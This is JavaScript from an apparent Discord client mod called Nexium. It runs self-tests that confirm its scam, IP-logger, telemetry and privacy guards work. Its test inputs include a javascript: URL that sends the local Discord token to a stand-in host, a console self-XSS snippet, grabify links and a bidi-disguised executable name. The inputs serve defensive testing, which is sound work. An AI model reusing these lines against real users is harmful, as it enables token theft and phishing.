var _NXPRV=window._NXPRV||(window._NXPRV={});
if(!_NXPRV.boot){try{
_NXPRV.boot=true;
_NXPRV.T=[];
_NXPRV.res={};
_NXPRV.encours=false;
_NXPRV.fini=0;
_NXPRV.listeners=[];
_NXPRV.notify=function(){for(var a=0;a<_NXPRV.listeners.length;a++){try{_NXPRV.listeners[a]();}catch(_){}}};
_NXPRV.ajoute=function(g,id,t,d,fn){_NXPRV.T.push({g:g,id:id,t:t,d:d,fn:fn});};
_NXPRV.compte=function(g){var n={agit:0,echec:0,coupe:0,na:0,total:0};
for(var a=0;a<_NXPRV.T.length;a++){var e=_NXPRV.T[a];if(g&&e.g!==g)continue;n.total++;
var r=_NXPRV.res[e.id];if(r&&n[r.etat]!=null)n[r.etat]++;}
return n;};
_NXPRV.pose=function(id,etat,det){_NXPRV.res[id]={etat:etat,det:det||"",t:Date.now()};_NXPRV.notify();};
_NXPRV.lance=function(g,fin){try{
if(_NXPRV.encours)return false;
_NXPRV.encours=true;_NXPRV.fini=0;_NXPRV.debut=Date.now();_NXPRV.muet=true;_NXPRV.avertis=[];
var L=[];
for(var a=0;a<_NXPRV.T.length;a++){if(!g||_NXPRV.T[a].g===g)L.push(_NXPRV.T[a]);}
for(var b=0;b<L.length;b++)delete _NXPRV.res[L[b].id];
_NXPRV.total=L.length;_NXPRV.notify();
var k=0;
var suite=function(){
if(k>=L.length){_NXPRV.encours=false;_NXPRV.muet=false;_NXPRV.duree=Date.now()-_NXPRV.debut;_NXPRV.notify();if(fin)try{fin(_NXPRV.compte(g));}catch(_){}return;}
var e=L[k++];
var rendu=false;
var minuteur=setTimeout(function(){if(rendu)return;rendu=true;_NXPRV.pose(e.id,"echec","aucune reponse en 9 s");_NXPRV.fini++;suite();},9000);
var fini=function(etat,det){if(rendu)return;rendu=true;try{clearTimeout(minuteur);}catch(_){}
_NXPRV.pose(e.id,etat,det);_NXPRV.fini++;setTimeout(suite,60);};
try{e.fn(fini);}catch(err){fini("echec",(err&&err.message)||"exception");}};
suite();
return true;}catch(_){_NXPRV.encours=false;_NXPRV.muet=false;return false;}};

_NXPRV.instantane=function(){try{
return {st:JSON.stringify(_NXPR.stats),quar:JSON.stringify(_NXPR.quar||[])};}catch(_){return null;}};
_NXPRV.restaure=function(sn){try{
if(!sn)return;
_NXPR.stats=JSON.parse(sn.st);_NXPR.quar=JSON.parse(sn.quar);
_NXPR.saveStats();_NXPR.saveQuar();_NXPR.notify();}catch(_){}};
_NXPRV.instP=function(){try{return JSON.stringify(_NXP.stats);}catch(_){return null;}};
_NXPRV.restP=function(sn){try{if(!sn)return;_NXP.stats=JSON.parse(sn);_NXP.saveStatsNow();_NXP.tnotify();}catch(_){}};
_NXPRV.avertis=[];_NXPRV.muet=false;
_NXPRV.parMessage=function(contenu,attendu,fin,pj){
var sn=_NXPRV.instantane();
var n0=_NXPRV.avertis.length;
try{
_NXPR.onMsg({message:{id:"1",channel_id:"1",content:contenu,
author:{id:"424242424242424242",username:"preuve",bot:false},
attachments:pj||[],embeds:[]}});
var rec=(_NXPR.stats.recent||[]);
var vus=[];for(var a=0;a<rec.length;a++)vus.push(rec[a].k);
var det=rec.length?(rec[0].k+" : "+String(rec[0].d||"").slice(0,70)):"";
var avert=_NXPRV.avertis.length>n0?_NXPRV.avertis[n0]:"";
_NXPRV.restaure(sn);
if(vus.indexOf(attendu)>=0)return fin("agit",det+(avert?" - averti : "+avert.slice(0,80):" - aucun avertissement affiche"));
return fin("echec",vus.length?("detecte a la place : "+vus.join(", ")):"rien detecte");
}catch(e){_NXPRV.restaure(sn);return fin("echec",(e&&e.message)||"exception");}};
_NXPRV.fluxDispo=function(){try{var C=_NXcommon();
return !!((C&&C.C&&C.C.FluxDispatcher)||(C&&C.WP&&C.WP.findByProps&&C.WP.findByProps("subscribe","dispatch","_actionHandlers")));}catch(_){return false;}};
_NXPRV.fermeModale=function(){try{
var m=document.getElementById("nx-blocked-modal");
if(m&&m.parentNode){m.parentNode.removeChild(m);return true;}
return false;}catch(_){return false;}};

_NXPRV.ajoute("protect","pr_classe","Reconnaissance d un logger d IP",
"Un vrai lien grabify est passe au classificateur.",function(fin){
if(!_NXPR.cfg.scanLinks)return fin("coupe","l analyse des liens est eteinte dans les reglages");
var cl=_NXPR.classify("http://grabify.link/nx-preuve-"+Date.now());
if(cl&&cl.kind==="grabber")return fin("agit","grabify.link classe comme logger d IP");
return fin("echec","classe comme "+((cl&&cl.kind)||"rien"));});

_NXPRV.ajoute("protect","pr_base","Base de menaces chargee",
"Le nombre d empreintes reellement en memoire, et une recherche reelle dedans.",function(fin){
var f=_NXPR.empreintes;
if(!f||!f.length)return fin("echec","aucune empreinte en memoire");
var trouve=_NXPR.dansR("grabify.link");
var det=f.length+" empreintes ("+Math.round(f.byteLength/104857.6)/10+" Mo)";
if(_NXPR.remote&&_NXPR.remote.at)det+=", chargee il y a "+Math.max(0,Math.round((Date.now()-_NXPR.remote.at)/60000))+" min";
return fin("agit",det+(trouve?", recherche concluante":", recherche negative sur le temoin"));});

_NXPRV.ajoute("protect","pr_clic","Un clic sur un lien piege est reellement bloque",
"Un vrai lien est cree, un vrai clic est envoye : on verifie que le navigateur ne suit pas.",function(fin){
if(!_NXPR.cfg.scanLinks||!_NXPR.cfg.blockGrabbers)return fin("coupe","le blocage des loggers d IP est eteint");
if(!_NXPR._dom)return fin("echec","les ecouteurs de clic ne sont pas poses");
var sn=_NXPRV.instantane();
var a=null;
try{
a=document.createElement("a");
a.href="http://grabify.link/nx-preuve";
a.textContent=_NXtr("preuve");
a.setAttribute("aria-hidden","true");
a.style.cssText="position:fixed;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0;";
document.body.appendChild(a);
var ev=new MouseEvent("click",{bubbles:true,cancelable:true,view:window});
a.dispatchEvent(ev);
var bloque=!!ev.defaultPrevented;
var modale=!!document.getElementById("nx-blocked-modal");
_NXPRV.fermeModale();
try{if(a.parentNode)a.parentNode.removeChild(a);}catch(_){}
_NXPRV.restaure(sn);
if(bloque&&modale)return fin("agit","clic annule et fenetre d avertissement affichee");
if(bloque)return fin("agit","clic annule, sans fenetre");
return fin("echec","le clic n a pas ete annule");
}catch(e){
try{if(a&&a.parentNode)a.parentNode.removeChild(a);}catch(_){}
_NXPRV.fermeModale();_NXPRV.restaure(sn);
return fin("echec",(e&&e.message)||"exception");}});

_NXPRV.ajoute("protect","pr_avert","Un avertissement atteint vraiment l ecran",
"Un vrai avertissement est affiche, mesure, puis retire.",function(fin){
var voieD=false;
try{var C=_NXcommon().C;voieD=!!(C&&C.Toasts&&typeof C.Toasts.show==="function");}catch(_){}
var ok=false;
try{ok=_NXPR.toastDom("Preuve Nexium : cet avertissement est reel.",1);}catch(_){}
if(!ok)return fin("echec","le repli d affichage a echoue"+(voieD?", mais la voie Discord repond":""));
setTimeout(function(){try{
var box=document.getElementById("nx-avert");
var el=box&&box.lastChild;
var r=el&&el.getBoundingClientRect?el.getBoundingClientRect():null;
var vu=!!(r&&r.width>40&&r.height>10);
try{if(el&&el.parentNode)el.parentNode.removeChild(el);}catch(_){}
if(!vu)return fin("echec","l avertissement a ete cree mais n occupe aucune place a l ecran");
return fin("agit",Math.round(r.width)+"x"+Math.round(r.height)+" px"+(voieD?", voie Discord aussi disponible":", voie Discord indisponible : le repli Nexium prend le relais"));
}catch(e){return fin("echec",(e&&e.message)||"exception");}},80);});

_NXPRV.ajoute("protect","pr_fichier","Un executable deguise en image est reconnu",
"Les octets d un vrai en-tete Windows sont passes au lecteur de signature.",function(fin){
if(!_NXPR.cfg.scanFiles)return fin("coupe","l analyse des fichiers est eteinte");
try{
var b=new Uint8Array([0x4D,0x5A,0x90,0x00,0x03,0x00,0x00,0x00,0x04,0x00,0x00,0x00,0xFF,0xFF,0x00,0x00]);
var sig=_NXPR.matchSig(b);
if(sig&&sig.bad)return fin("agit","en-tete MZ reconnu : "+sig.t);
if(sig)return fin("echec","reconnu comme "+sig.t+" mais non signale dangereux");
return fin("echec","en-tete MZ non reconnu");}catch(e){return fin("echec",(e&&e.message)||"exception");}});

_NXPRV.ajoute("protect","pr_secret","Un jeton dans un message est repere",
"Un faux jeton au format reel est passe au detecteur.",function(fin){
try{
var faux="MTIzNDU2Nzg5MDEyMzQ1Njc4."+"Gk9Vzq."+"nx_preuve_ceci_nest_pas_un_vrai_jeton_00";
if(_NXPR.RXTOKEN&&_NXPR.RXTOKEN.test(faux)){try{_NXPR.RXTOKEN.lastIndex=0;}catch(_){}return fin("agit","format de jeton reconnu");}
try{_NXPR.RXTOKEN.lastIndex=0;}catch(_){}
return fin("echec","le format de jeton n est pas reconnu");}catch(e){return fin("echec",(e&&e.message)||"exception");}});

_NXPRV.ajoute("protect","pr_masque","Un lien trompeur est demasque",
"Un lien qui affiche discord.com mais mene ailleurs est passe au scanner, et on verifie qu il finit au journal.",function(fin){
if(!_NXPR.cfg.scanLinks||!_NXPR.cfg.scanMasked)return fin("coupe","le demasquage des liens est eteint");
var sn=_NXPRV.instantane();
var avant=((_NXPR.stats.recent||[]).length);
try{
_NXPR.scanMasked("[https://discord.com/nitro](http://grabify.link/nx-preuve)");
var apres=((_NXPR.stats.recent||[]).length);
var dernier=(_NXPR.stats.recent||[])[0];
var det=dernier?(dernier.k+" : "+dernier.d):"";
_NXPRV.restaure(sn);
if(apres>avant)return fin("agit","inscrit au journal ("+det+")");
return fin("echec","aucune trace au journal");}catch(e){_NXPRV.restaure(sn);return fin("echec",(e&&e.message)||"exception");}});

_NXPRV.ajoute("protect","pr_ecoute","Les ecouteurs sont bien poses",
"On verifie que Nexium est reellement branche aux clics, aux collages et aux messages.",function(fin){
var manque=[];
if(!_NXPR._dom)manque.push("clics et collages");
if(!_NXPR.abonne)manque.push("messages Discord");
if(!manque.length)return fin("agit","clics, collages et messages : branches");
if(!_NXPR.abonne&&!_NXPRV.fluxDispo())return fin("na","Discord n a pas encore ouvert son flux de messages");
if(manque.length===2)return fin("echec","aucun branchement actif");
return fin("echec","branchement manquant : "+manque.join(", "));});

_NXPRV.ajoute("protect","pr_masquage","Un lien dangereux est reellement recouvert",
"Un vrai lien est pose dans la page, puis on mesure ce qu il reste de lisible a l ecran.",function(fin){
if(!_NXPR.cfg.scanLinks||!_NXPR.cfg.maskLinks)return fin("coupe","le masquage des liens est eteint");
var a=null;
try{
a=document.createElement("a");
a.href="http://grabify.link/nx-preuve-masque";
a.textContent=_NXtr("clique ici pour ton nitro gratuit");
a.style.cssText="position:fixed;left:8px;bottom:8px;z-index:1;";
document.body.appendChild(a);
var n=_NXPR.masqueUn(a);
var masque=!!(a.classList&&a.classList.contains("nx-masque"));
var etiquette=a.getAttribute("data-nx-masque")||"";
var vu="";
try{vu=(getComputedStyle(a,"::after").content||"").replace(/^"|"$/g,"");}catch(_){}
var couleur="";
try{couleur=getComputedStyle(a).color;}catch(_){}
var invisible=(couleur.indexOf("rgba")>=0&&couleur.indexOf(", 0)")>=0)||couleur==="transparent";
try{if(a.parentNode)a.parentNode.removeChild(a);}catch(_){}
if(!masque)return fin("echec","le lien n a pas ete recouvert");
if(!etiquette)return fin("echec","le lien est recouvert mais rien n explique pourquoi");
if(!invisible)return fin("agit",etiquette+" (le texte d origine reste lisible : la feuille de style n est pas appliquee)");
return fin("agit",etiquette+" - le texte d origine n est plus lisible"+(vu?" et l etiquette est peinte":""));
}catch(e){try{if(a&&a.parentNode)a.parentNode.removeChild(a);}catch(_){}
return fin("echec",(e&&e.message)||"exception");}});

_NXPRV.ajoute("protect","pr_repetition","Un meme lien n est pas ranalyse sans fin",
"Le meme lien est soumis deux fois : on verifie qu il n est compte et annonce qu une seule fois.",function(fin){
if(!_NXPR.cfg.scanLinks)return fin("coupe","l analyse des liens est eteinte");
var sn=_NXPRV.instantane();
var n0=_NXPRV.avertis.length;
try{
var u="http://grabify.link/nx-preuve-repetition-"+Date.now();
_NXPR.scanUrl(u,true);
var s1=_NXPR.stats.scanned||0,j1=(_NXPR.stats.recent||[]).length,a1=_NXPRV.avertis.length;
_NXPR.scanUrl(u,true);
_NXPR.scanUrl(u,true);
var s2=_NXPR.stats.scanned||0,j2=(_NXPR.stats.recent||[]).length,a2=_NXPRV.avertis.length;
_NXPRV.restaure(sn);
if(s2!==s1)return fin("echec","le compteur monte encore : "+s1+" puis "+s2);
if(j2!==j1)return fin("echec","le journal se remplit encore : "+j1+" puis "+j2);
if(a2!==a1)return fin("echec","l avertissement se repete");
return fin("agit","3 passages, 1 seul comptage, 1 seul avertissement (le blocage, lui, reste actif a chaque clic)");
}catch(e){_NXPRV.restaure(sn);return fin("echec",(e&&e.message)||"exception");}});

_NXPRV.ajoute("protect","pr_sortie","Les gardes de sortie sont en place",
"On relit l etat reel des controles qui empechent tes donnees de sortir.",function(fin){
try{
if(!window._NXGD||typeof _NXGD.status!=="function")return fin("echec","le module de gardes est absent");
var s=_NXGD.status();
if(!s.reseau)return fin("echec","les gardes ne sont pas branchees au reseau");
var on=[];
if(s.webhook)on.push("webhooks");
if(s.egress)on.push("sorties");
if(s.balise)on.push("balises");
if(s.dom)on.push("injections");
if(s.charge)on.push("charges utiles");
if(!on.length)return fin("coupe","toutes les gardes de sortie sont eteintes");
return fin("agit",on.join(", ")+" - "+s.total+" adresse(s) surveillee(s)");}catch(e){return fin("echec",(e&&e.message)||"exception");}});

_NXPRV.ajoute("privacy","pv_fetch","Une requete de telemetrie est arretee",
"Une vraie requete vers le point de collecte de Discord est emise et suivie.",function(fin){
if(!_NXP.cfg.blockTel)return fin("coupe","le blocage de la telemetrie est eteint");
if(!window.fetch||!window.fetch.__nx)return fin("echec","la garde sur fetch n est pas en place");
var sn=_NXPRV.instP();
var avant=_NXP.stats.blocked||0;
try{
fetch("https://discord.com/api/v9/science?nx=preuve",{method:"POST",body:"{}"}).then(function(r){
var apres=_NXP.stats.blocked||0;
var monte=apres>avant;
_NXPRV.restP(sn);
if(r&&r.status===204&&monte)return fin("agit","requete interceptee, reponse vide rendue sans sortir de la machine");
if(r&&r.status===204)return fin("agit","requete interceptee (compteur inchange)");
return fin("echec","la requete est partie, statut "+((r&&r.status)||"?"));
}).catch(function(e){_NXPRV.restP(sn);return fin("echec","erreur : "+((e&&e.message)||"inconnue"));});
}catch(e){_NXPRV.restP(sn);return fin("echec",(e&&e.message)||"exception");}});

_NXPRV.ajoute("privacy","pv_xhr","Un envoi XHR de telemetrie est arrete",
"Un vrai XMLHttpRequest est ouvert et envoye vers le point de collecte.",function(fin){
if(!_NXP.cfg.blockTel)return fin("coupe","le blocage de la telemetrie est eteint");
if(!window.XMLHttpRequest||!window.XMLHttpRequest.prototype.__nx)return fin("echec","la garde sur XHR n est pas en place");
var sn=_NXPRV.instP();
try{
var x=new XMLHttpRequest();
x.open("POST","https://discord.com/api/v9/science?nx=preuve-xhr");
var parti=false;
x.onloadend=function(){parti=true;};
x.send("{}");
setTimeout(function(){
try{x.abort();}catch(_){}
_NXPRV.restP(sn);
if(parti)return fin("echec","la requete est partie");
if(x.readyState===1)return fin("agit","envoi neutralise, la requete n a jamais quitte la machine");
return fin("agit","envoi neutralise (etat "+x.readyState+")");},700);
}catch(e){return fin("echec",(e&&e.message)||"exception");}});

_NXPRV.ajoute("privacy","pv_balise","Les balises de fond sont arretees",
"On verifie que sendBeacon passe par Nexium et que le point de collecte est bien reconnu.",function(fin){
if(!navigator.sendBeacon)return fin("na","ce navigateur n a pas sendBeacon");
if(!navigator.sendBeacon.__nx)return fin("echec","la garde sur sendBeacon n est pas en place");
if(!_NXP.cfg.blockTel)return fin("coupe","le blocage de la telemetrie est eteint");
var k=_NXP.classify("https://discord.com/api/v9/metrics");
if(!k)return fin("echec","le point de collecte n est pas reconnu");
return fin("agit","garde posee, /metrics reconnu comme "+k);});

_NXPRV.ajoute("privacy","pv_ws","Une connexion permanente de collecte est refusee",
"Une vraie tentative d ouverture de WebSocket vers une adresse de collecte est faite.",function(fin){
if(!window.WebSocket||!window.WebSocket.__nx)return fin("echec","la garde sur WebSocket n est pas en place");
if(!_NXP.cfg.blockAnalytics)return fin("coupe","le blocage des mesures d audience est eteint");
var ws=null;
try{
ws=new WebSocket("wss://nx-preuve.invalid/analytics");
try{ws.close();}catch(_){}
return fin("echec","la connexion a ete acceptee");
}catch(e){
if(e&&e.message==="Blocked by Nexium")return fin("agit","ouverture refusee avant tout echange");
return fin("agit","ouverture refusee ("+((e&&e.message)||"erreur")+")");}});

_NXPRV.ajoute("privacy","pv_utm","Les marqueurs de suivi sont retires des liens",
"Un vrai lien marque est passe au nettoyeur.",function(fin){
if(!_NXP.cfg.stripTracking)return fin("coupe","le nettoyage des liens est eteint");
try{
var u="https://exemple.test/page?a=1&utm_source=discord&fbclid=xyz&gclid=abc";
var c=_NXP.cleanUrl(u);
var reste=[];
if(c.indexOf("utm_source")>=0)reste.push("utm_source");
if(c.indexOf("fbclid")>=0)reste.push("fbclid");
if(c.indexOf("gclid")>=0)reste.push("gclid");
if(reste.length)return fin("echec","marqueurs restants : "+reste.join(", "));
if(c.indexOf("a=1")<0)return fin("echec","le nettoyage a supprime un parametre legitime");
return fin("agit","3 marqueurs retires, le reste du lien intact");}catch(e){return fin("echec",(e&&e.message)||"exception");}});

_NXPRV.ajoute("privacy","pv_entetes","Les en-tetes de suivi sont retires",
"De vrais en-tetes de suivi sont soumis au filtre de sortie.",function(fin){
if(!_NXP.cfg.stripHeaders)return fin("coupe","le retrait des en-tetes est eteint");
try{
var o=_NXP.stripOut({headers:{"x-track":"1","x-discord-timezone":"Europe/Paris","content-type":"application/json"}});
var h=(o&&o.headers)||{};
var reste=[];
for(var k in h){if(String(k).toLowerCase()==="x-track"||String(k).toLowerCase()==="x-discord-timezone")reste.push(k);}
if(reste.length)return fin("echec","en-tetes restants : "+reste.join(", "));
if(!h["content-type"])return fin("echec","un en-tete legitime a ete supprime");
return fin("agit","x-track et x-discord-timezone retires, content-type conserve");}catch(e){return fin("echec",(e&&e.message)||"exception");}});

_NXPRV.ajoute("privacy","pv_noms","Les noms de fichiers envoyes sont anonymises",
"Un vrai corps d envoi de piece jointe est passe au masque.",function(fin){
if(!_NXP.cfg.stripFilenames)return fin("coupe","l anonymisation des noms est eteinte");
try{
var body=JSON.stringify({files:[{filename:"photo_maison_2019.png",id:0}]});
var o=_NXP.maskNames("https://discord.com/api/v9/channels/1/attachments",{body:body});
var j=JSON.parse(o.body);
var n=j.files[0].filename;
if(n==="photo_maison_2019.png")return fin("echec","le nom n a pas ete change");
if(n.indexOf(".png")<0)return fin("echec","l extension a ete perdue : "+n);
return fin("agit","photo_maison_2019.png devient "+n);}catch(e){return fin("echec",(e&&e.message)||"exception");}});

_NXPRV.ajoute("privacy","pv_stun","Les serveurs STUN etrangers sont ecartes",
"Une vraie connexion pair-a-pair est ouverte avec un serveur de Google, puis inspectee.",function(fin){
if(!_NXP.cfg.blockStun)return fin("coupe","le filtrage des serveurs STUN est eteint");
if(!window.RTCPeerConnection)return fin("na","ce navigateur n a pas RTCPeerConnection");
if(!window.RTCPeerConnection.__nxp)return fin("echec","la garde sur RTCPeerConnection n est pas en place");
var pc=null;
try{
pc=new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"},{urls:"stun:stun.discord.media:3478"}]});
var c=(pc.getConfiguration&&pc.getConfiguration())||{};
var L=c.iceServers||[];
var reste=[];
for(var a=0;a<L.length;a++){var u=L[a]&&L[a].urls;var t=(typeof u==="string")?[u]:(u||[]);
for(var b=0;b<t.length;b++)reste.push(String(t[b]));}
try{pc.close();}catch(_){}
var google=false;for(var d=0;d<reste.length;d++)if(reste[d].indexOf("google")>=0)google=true;
if(google)return fin("echec","le serveur de Google est toujours dans la liste");
return fin("agit","serveur de Google ecarte, "+reste.length+" serveur(s) Discord conserve(s)");
}catch(e){try{if(pc)pc.close();}catch(_){}return fin("echec",(e&&e.message)||"exception");}});

_NXPRV.ajoute("privacy","pv_materiel","Les caracteristiques de la machine sont normalisees",
"On lit ce que le site verrait reellement.",function(fin){
if(!_NXP.cfg.spoofHardware)return fin("coupe","la normalisation du materiel est eteinte");
try{
var c=navigator.hardwareConcurrency,m=navigator.deviceMemory;
if(c===8&&(m===8||m===undefined))return fin("agit","un site lit 8 coeurs et 8 Go, quelle que soit ta machine");
return fin("echec","un site lit encore "+c+" coeurs et "+m+" Go");}catch(e){return fin("echec",(e&&e.message)||"exception");}});

_NXPRV.ajoute("privacy","pv_presse","Les liens copies sont nettoyes",
"On verifie que la copie passe par Nexium, puis on nettoie un lien reel.",function(fin){
if(!_NXP.cfg.cleanClipboard)return fin("coupe","le nettoyage du presse-papiers est eteint");
if(!navigator.clipboard||!navigator.clipboard.writeText)return fin("na","ce navigateur ne donne pas acces au presse-papiers");
if(!navigator.clipboard.writeText.__nx)return fin("echec","la garde sur le presse-papiers n est pas en place");
try{
var c=_NXP.cleanUrl("https://exemple.test/x?utm_campaign=nx");
if(c.indexOf("utm_campaign")>=0)return fin("echec","le nettoyeur ne retire pas le marqueur");
return fin("agit","garde posee, un lien copie est nettoye avant d atteindre le presse-papiers");}catch(e){return fin("echec",(e&&e.message)||"exception");}});

_NXPRV.ajoute("privacy","pv_flux","Les evenements internes sont filtres",
"On verifie que Nexium est bien insere dans le flux d evenements de Discord.",function(fin){
if(!_NXP.fxi&&!_NXPRV.fluxDispo())return fin("na","Discord n a pas encore ouvert son flux d evenements");
if(!_NXP.fxi)return fin("echec","l intercepteur d evenements n est pas pose");
var sn=_NXPRV.instP();
try{
var r=_NXP.onFlux({type:"TRACK",event:"nx_preuve"});
_NXPRV.restP(sn);
return fin("agit","intercepteur pose, un evenement de suivi est "+(r?"arrete":"laisse passer, la telemetrie est eteinte dans les reglages"));}catch(e){_NXPRV.restP(sn);return fin("echec",(e&&e.message)||"exception");}});

_NXPRV.ajoute("protect","pr_arnaque","Un message d arnaque est reconnu",
"Un vrai message de type nitro gratuit traverse toute la chaine de lecture.",function(fin){
if(!_NXPR.cfg.scamAlerts)return fin("coupe","les alertes d arnaque sont eteintes");
_NXPRV.parMessage("Free nitro pour tout le monde, claim your free gift ici : https://discord-nitro-free.example/claim","scam",fin);});

_NXPRV.ajoute("protect","pr_ip","Un lien vers une adresse IP brute est signale",
"Un vrai message contenant une adresse IB brute traverse la chaine de lecture.",function(fin){
if(!_NXPR.cfg.ipGuard)return fin("coupe","la garde sur les adresses IP est eteinte");
_NXPRV.parMessage("regarde ca http://185.234.12.9/setup et dis moi","rawip",fin);});

_NXPRV.ajoute("protect","pr_oauth","Une autorisation d application dangereuse est signalee",
"Un vrai lien d autorisation avec des droits sensibles traverse la chaine de lecture.",function(fin){
if(!_NXPR.cfg.oauthGuard)return fin("coupe","la garde sur les autorisations est eteinte");
_NXPRV.parMessage("rejoins mon serveur https://discord.com/oauth2/authorize?client_id=1&scope=bot%20webhook.incoming&permissions=8","oauth",fin);});

_NXPRV.ajoute("protect","pr_scheme","Un lien qui execute du code est signale",
"Un vrai schema executable traverse la chaine de lecture.",function(fin){
if(!_NXPR.cfg.schemeGuard)return fin("coupe","la garde sur les schemas est eteinte");
_NXPRV.parMessage("colle ca dans la barre : javascript:fetch('https://vol.example/'+localStorage.token)","scheme",fin);});

_NXPRV.ajoute("protect","pr_invisible","Un texte trompeur est signale",
"Un vrai message contenant une inversion du sens de lecture traverse la chaine.",function(fin){
if(!_NXPR.cfg.bidiGuard)return fin("coupe","la garde sur les caracteres trompeurs est eteinte");
_NXPRV.parMessage("telecharge ce fichier photo\u202Egnp.exe et ouvre le","bidi",fin);});

_NXPRV.ajoute("protect","pr_webhook","Un webhook publie dans un message est signale",
"Une vraie adresse de webhook traverse la chaine de lecture.",function(fin){
if(!_NXPR.cfg.scamAlerts)return fin("coupe","les alertes d arnaque sont eteintes");
_NXPRV.parMessage("voila mon hook https://discord.com/api/webhooks/123456789012345678/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","secret",fin);});

_NXPRV.ajoute("protect","pr_console","Le code a coller dans la console est signale",
"Un vrai bout de code de vol de jeton traverse la chaine de lecture.",function(fin){
if(!_NXPR.cfg.consoleGuard)return fin("coupe","la garde sur la console est eteinte");
_NXPRV.parMessage("fais F12 puis colle : webpackChunkdiscord_app.push([[Math.random()],{},function(r){}])","selfxss",fin);});

_NXPRV.ajoute("protect","pr_piece","Une piece jointe executable est signalee",
"Une vraie piece jointe au nom piege traverse la chaine de lecture.",function(fin){
if(!_NXPR.cfg.scanFiles)return fin("coupe","l analyse des fichiers est eteinte");
_NXPRV.parMessage("tiens le crack","file",fin,[{filename:"photo_vacances.scr",url:"https://cdn.discordapp.com/nx-preuve",size:1024}]);});

_NXPRV.ajoute("protect","pr_veille","La console porte l avertissement anti-arnaque",
"On verifie que le message qui protege du vol par la console a bien ete pose.",function(fin){
if(!_NXPR.cfg.consoleGuard)return fin("coupe","la garde sur la console est eteinte");
if(_NXPR._cw)return fin("agit","message pose dans la console au demarrage");
try{_NXPR.consoleWarn();}catch(_){}
if(_NXPR._cw)return fin("agit","message pose a la demande");
return fin("echec","le message n a pas pu etre pose");});

_NXPRV.ajoute("privacy","pv_frappe","L indicateur de frappe est retenu",
"Le vrai chemin qui previent tes contacts que tu ecris est soumis au filtre.",function(fin){
if(!_NXP.cfg.silentTyping)return fin("coupe","l indicateur de frappe est laisse actif");
var sn=_NXPRV.instP();
try{var r=_NXP.shouldBlock("https://discord.com/api/v9/channels/424242/typing");
_NXPRV.restP(sn);
if(r)return fin("agit","le signal je suis en train d ecrire ne part plus");
return fin("echec","le signal part encore");}catch(e){_NXPRV.restP(sn);return fin("echec",(e&&e.message)||"exception");}});

_NXPRV.ajoute("privacy","pv_lu","L accuse de lecture est retenu",
"Le vrai chemin qui signale que tu as lu un message est soumis au filtre.",function(fin){
if(!_NXP.cfg.noAck)return fin("coupe","l accuse de lecture est laisse actif");
var sn=_NXPRV.instP();
try{var r=_NXP.shouldBlock("https://discord.com/api/v9/channels/424242/messages/1/ack");
_NXPRV.restP(sn);
if(r)return fin("agit","le signal j ai lu ne part plus");
return fin("echec","le signal part encore");}catch(e){_NXPRV.restP(sn);return fin("echec",(e&&e.message)||"exception");}});

_NXPRV.ajoute("privacy","pv_purge","L effacement a la fermeture sait quoi effacer",
"On liste, sans rien effacer, ce qui disparaitra a la fermeture.",function(fin){
if(!_NXP.cfg.purgeOnQuit)return fin("coupe","l effacement a la fermeture est eteint");
try{var a=_NXP.purgeApercu();
if(!a.total)return fin("echec","aucune trace n est declaree");
return fin("agit",a.n+" trace(s) sur "+a.total+" presentes, "+Math.round(a.octets/1024)+" Ko, effacees a la fermeture");}catch(e){return fin("echec",(e&&e.message)||"exception");}});

_NXPRV.ajoute("privacy","pv_gardes","Aucune garde n a ete ecrasee",
"On relit l etat reel des six points d interception.",function(fin){
try{
var t=_NXP.gardesTombees();
if(!t.length)return fin("agit","fetch, XHR, balises, WebSocket et pair-a-pair : tous tenus"+(_NXP.repose?" ("+_NXP.repose+" remise(s) en place depuis le demarrage)":""));
return fin("echec","garde(s) tombee(s) : "+t.join(", "));}catch(e){return fin("echec",(e&&e.message)||"exception");}});

}catch(_nxE){try{window._NXFAIL=window._NXFAIL||[];_NXFAIL.push("_NXPRV");if(window._NXERR)_NXERR.push("module _NXPRV :: "+((_nxE&&_nxE.message)||"erreur"));}catch(_){}}
}
